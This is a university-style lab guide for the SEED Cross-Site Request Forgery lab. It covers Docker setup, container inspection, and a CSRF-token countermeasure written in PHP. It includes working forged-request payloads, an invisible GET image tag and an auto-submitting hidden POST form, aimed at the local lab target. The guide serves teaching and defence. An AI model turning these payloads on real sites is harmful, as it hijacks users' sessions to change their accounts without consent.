# Lab 03 — Cross-Site Request Forgery (CSRF) Attack Lab

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Web_CSRF_Elgg/
Textbook: Chapter 10 — Cross-Site Request Forgery (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#4-lab-03--cross-site-request-forgery-csrf)
CWE Reference: [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)

For authorized educational use only.

---

## Security Concept

CSRF exploits the fact that browsers automatically attach session cookies to every request sent to a domain, regardless of which page triggered the request.

When Alice is logged into `www.seed-server.com` and then visits `www.attacker32.com`, the attacker's page can silently send HTTP requests to the SEED server using Alice's active session. The server cannot tell these requests apart from Alice's legitimate actions — both carry her session cookie.

```
Alice logs into www.seed-server.com
  -> Browser stores session cookie for seed-server.com

Alice visits www.attacker32.com (attacker's page)
  -> Attacker page contains:
     <img src="http://www.seed-server.com?action=addfriend&friend=59">
  -> Browser automatically attaches Alice's seed-server.com cookie to this request
  -> The SEED server receives it as if Alice intentionally sent it
  -> Samy is added to Alice's friend list without her knowledge
```

This lab requires two containers — one for the target site and one for the attacker site — to correctly simulate the cross-origin attack scenario.

---

## Container Architecture

```
HOST MACHINE
  |
  | Hosts file: www.seed-server.com -> 10.9.0.5
  | Hosts file: www.attacker32.com  -> 10.9.0.105
  |
  | Port 10082 -> elgg-10.9.0.5-csrf:80      (target site)
  | Port 10083 -> attacker-10.9.0.105:80     (attacker site)
  |
  Docker Bridge Network: net-10.9.0.0-csrf (10.9.0.0/24)
    |
    +---- elgg-10.9.0.5-csrf   (Apache + PHP + Elgg, www.seed-server.com)
    |         |
    +---- mysql-10.9.0.6-csrf  (MySQL 8.0 + elgg_csrf database)
    |
    +---- attacker-10.9.0.105  (Apache static, www.attacker32.com)
```

---

## Layer 1 — Docker Commands (host terminal)

### Start the Lab

```bash
cd labs/03-csrf
docker compose up -d --build

# Three containers start:
# elgg-10.9.0.5-csrf   -> legitimate Elgg site (port 10082)
# attacker-10.9.0.105  -> malicious attacker site (port 10083)
# mysql-10.9.0.6-csrf  -> MySQL database
```

```powershell
# Windows
cd labs\03-csrf
docker compose up -d --build
```

### Verify Containers

```bash
docker compose ps

# NAME                   IMAGE                       STATUS    PORTS
# elgg-10.9.0.5-csrf     seed-image-www-csrf-elgg    Up        0.0.0.0:10082->80/tcp
# attacker-10.9.0.105    seed-image-www-csrf-attacker Up       0.0.0.0:10083->80/tcp
# mysql-10.9.0.6-csrf    seed-image-mysql-csrf        Up        3306/tcp
```

### Inspect Network

```bash
docker network inspect net-10.9.0.0-csrf

# Verify IPs:
docker inspect -f '{{.Name}} -> {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
  elgg-10.9.0.5-csrf attacker-10.9.0.105
```

### Watch Logs from Host

```bash
# Watch requests arrive on the Elgg server while performing the CSRF attack
docker compose logs -f elgg
```

---

## Layer 2 — Linux Commands (inside the containers)

### Open Bash in the Elgg (Target) Container

```bash
docker exec -it elgg-10.9.0.5-csrf bash
```

Prompt changes:
```
Before: PS C:\>  OR  user@host:~$
After:  root@elgg-10.9.0.5-csrf:/#
```

### Inspect the Target Application

```bash
whoami && hostname && ip addr show | grep inet
# root | elgg-10.9.0.5-csrf | 10.9.0.5/24

cd /var/www/html
ls -la
cat index.php

# Find action handlers that process GET/POST without CSRF token verification
grep -n "action\|addfriend\|update_profile" index.php

# View incoming requests in real time
tail -f /var/log/apache2/access.log

exit
```

### Open Bash in the Attacker Container

```bash
docker exec -it attacker-10.9.0.105 bash
```

Prompt changes:
```
Before: PS C:\>  OR  user@host:~$
After:  root@attacker-10.9.0.105:/#
```

```bash
whoami && hostname && ip addr show | grep inet
# root | attacker-10.9.0.105 | 10.9.0.105/24

cd /var/www/html
ls -la
cat index.html
# Inspect the GET/POST CSRF payload embedded in the attacker page

exit
```

### Enter MySQL Container

```bash
docker exec -it mysql-10.9.0.6-csrf bash
mysql -u root -pseedubuntu
USE elgg_csrf;
SHOW TABLES;
SELECT * FROM users;
EXIT;
exit
```

---

## Layer 3 — Security Tasks

### Configure Hostnames

Windows (PowerShell as Administrator):
```powershell
$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
Add-Content $hostsFile "10.9.0.5     www.seed-server.com"
Add-Content $hostsFile "10.9.0.105   www.attacker32.com"
```

Linux / WSL2:
```bash
echo "10.9.0.5     www.seed-server.com" | sudo tee -a /etc/hosts
echo "10.9.0.105   www.attacker32.com"  | sudo tee -a /etc/hosts
```

### Lab Workflow

You need two separate browser sessions (use two different browser profiles or incognito).

```
Step 1: Open http://www.seed-server.com  (or http://localhost:10082)
        Log in as Alice (victim)
        Verify Alice's current friend list

Step 2: In the SAME browser session (Alice still logged in),
        Open a new tab and visit http://www.attacker32.com  (or http://localhost:10083)
        The attacker page loads automatically

Step 3: Observe what happens on the SEED server.
        Check if Alice's friend list changed or profile was modified.
```

### Task 2 — GET-Based CSRF Attack

The attacker page contains an invisible image tag:
```html
<img src="http://www.seed-server.com/index.php?action=addfriend&friend=59" width="1" height="1">
```

When Alice's browser loads the attacker page, it fetches this URL — attaching Alice's session cookie. The server processes it as a legitimate add-friend request.

Verify the attack worked:
```bash
docker exec -it mysql-10.9.0.6-csrf mysql -u root -pseedubuntu \
  -e "SELECT * FROM elgg_csrf.users;"
```

### Task 3 — POST-Based CSRF Attack

The attacker page contains a hidden form with auto-submit JavaScript:
```html
<form id="csrf-form" action="http://www.seed-server.com/index.php" method="POST">
  <input type="hidden" name="action" value="update_profile">
  <input type="hidden" name="bio" value="Hacked by CSRF!">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### Task 4 — Countermeasure: CSRF Token

Add a server-generated unpredictable token to every form. The attacker's page cannot know this token, so the forged POST is rejected.

```php
// Server generates token on session start:
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Token is embedded in every form (attacker cannot read it — same-origin policy):
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// On POST, server validates:
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch — request rejected.');
}
```

Modify the code, copy it back:
```bash
docker cp elgg-10.9.0.5-csrf:/var/www/html/index.php ./index.php
# Edit: add token generation and validation
docker cp ./index.php elgg-10.9.0.5-csrf:/var/www/html/index.php
```

### Inspect the Attack Request with Browser DevTools

In Chrome or Firefox:
1. Press F12 to open DevTools
2. Go to the Network tab
3. Visit the attacker page while logged in as Alice
4. Watch the cross-origin request to `www.seed-server.com` appear automatically

---

## Stop and Reset

```bash
docker compose down
docker compose down -v && docker compose up -d --build
```

```powershell
# Windows
docker compose down -v
docker compose up -d --build
```

---

## Key File Locations

| File | Container | Path |
|------|-----------|------|
| Target app (Elgg) | `elgg-10.9.0.5-csrf` | `/var/www/html/index.php` |
| Attacker page | `attacker-10.9.0.105` | `/var/www/html/index.html` |
| Apache access log | `elgg-10.9.0.5-csrf` | `/var/log/apache2/access.log` |
| Apache access log | `attacker-10.9.0.105` | `/var/log/apache2/access.log` |
| DB init script | `mysql-10.9.0.6-csrf` | `/docker-entrypoint-initdb.d/elgg.sql` |
